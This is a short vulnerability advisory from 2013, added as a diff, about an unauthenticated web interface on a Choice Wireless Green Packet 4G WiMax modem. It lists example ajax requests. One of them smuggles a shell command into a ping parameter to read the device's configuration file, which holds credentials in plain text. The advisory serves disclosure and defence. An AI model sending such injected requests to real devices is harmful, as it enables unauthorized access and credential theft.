@@ -1,0 +1,11 @@
+Date First Published: 2013-06-28
+
+Choice Wireless Green Packet 4G WiMax modem vulnerability
+
+It has been reported that Choice Wireless Green Packet 4G WiMax modem, model number WIXFMR-111, contains a web interface which is listening on both the LAN and WAN side that allows administrators to view or modify the configuration of the device. This web interface fails to properly authenticate ajax requests, allowing a remote unauthenticated attacker to view system configuration information or possibly execute commands on the device.
+Example ajax requests include:
+Request to http://<device ip>/ajax.cgi?action=wmxState will provide the current status of the WiMax connection.
+Request to http://<device ip>/ajax.cgi?action=netState will provide detailed information about the current network status, including LAN and WAN IP addresses, interface MAC addresses, etc.
+Request to http://<device ip>/ajax.cgi?action=tag_ipPing&pip=1+%26%26+cat+%2Fetc%2Fsncfg%2Fwmx.cfg will list the device's WiMax configuration, including username and password in plain text.
+
+A remote unauthenticated attacker may view system configuration information or possibly execute commands on the device.
